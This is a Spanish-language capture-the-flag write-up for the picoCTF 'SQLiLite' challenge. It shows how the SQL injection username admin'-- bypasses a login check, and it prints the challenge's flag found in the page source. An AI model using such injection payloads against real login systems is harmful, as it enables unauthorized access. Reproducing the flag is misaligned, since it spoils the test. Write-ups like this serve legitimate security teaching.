# SQLiLite

## Descripción
Can you login to this website?
## Solución
### Solución:
Al entrar a la página que nos dan, vemos esta pantalla de login
![[08SQLiLite.png]]

Al loguearnos con un username y contraseña genéricos como admin y '123', obtenemos este texto de error, que también nos da una idea de la sentencia sql que se hace para consultar las credenciales
```
username: admin
password: 123
SQL query: SELECT * FROM users WHERE name='admin' AND password='123'

# Login failed.
```

Ahora lo que haremos es alterar las credenciales que insertaremos para modificar esa sentencia, de tal forma que quede así, así que admin pasa a ser '**admin' --** '
```
SELECT * FROM users WHERE name='admin' -- ' AND password=''
```

Ahora estamos logueados, así que obtenemos este texto
```
username: admin'--
password: 
SQL query: SELECT * FROM users WHERE name='admin'--' AND password=''

# Logged in! But can you see the flag, it is in plainsight.
```

Como casi siempre, nuestra flag está en el código fuente de la página
```
<pre>username: admin&#039;--
password: 
SQL query: SELECT * FROM users WHERE name=&#039;admin&#039;--&#039; AND password=&#039;&#039;
</pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_ec8a64c7}</p>
```

picoCTF{L00k5_l1k3_y0u_solv3d_it_ec8a64c7}
## Notas
